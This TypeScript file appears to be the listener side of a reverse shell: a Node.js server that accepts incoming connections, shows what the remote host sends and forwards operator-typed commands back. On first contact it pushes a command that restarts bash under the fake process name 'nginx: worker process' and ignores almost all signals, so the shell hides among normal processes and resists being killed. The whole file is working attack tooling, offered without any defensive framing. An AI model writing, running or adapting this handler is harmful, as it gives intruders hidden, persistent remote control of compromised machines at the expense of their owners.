import * as net from 'net'
import * as readline from 'readline'
import 'process'

import * as config from './config'


const server = net.createServer();
const userinput = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

server.listen(config.listenport, config.listenaddr);

console.log(`Handler server listening on: ${config.listenaddr}, Port: ${config.listenport}`);


server.on('connection', (socket) => {
    // console.log(socket);

    let flag: boolean = true;

    socket.on('data', (data) => {
        // console.log(data.toString('utf-8'));
        process.stdout.write(data);

        if (flag) {
            socket.write(Buffer.from("exec -l -a 'nginx: worker process' bash && trap '' TERM ALRM QUIT ABRT HUP INT ILL FPE SEGV PIPE USR1 USR2 TSTP TTIN TTOU BUS PROF SYS TRAP VTALRM XFSZ IO EMT\r\n"));
            flag = false;
        }

        userinput.question('', (command) => {
            command = command.trim();
            socket.write(Buffer.from(`${command}\n`));
        });

    });

});


server.on('error', (err) => {
    console.log(`Error: ${err.message}`);
});

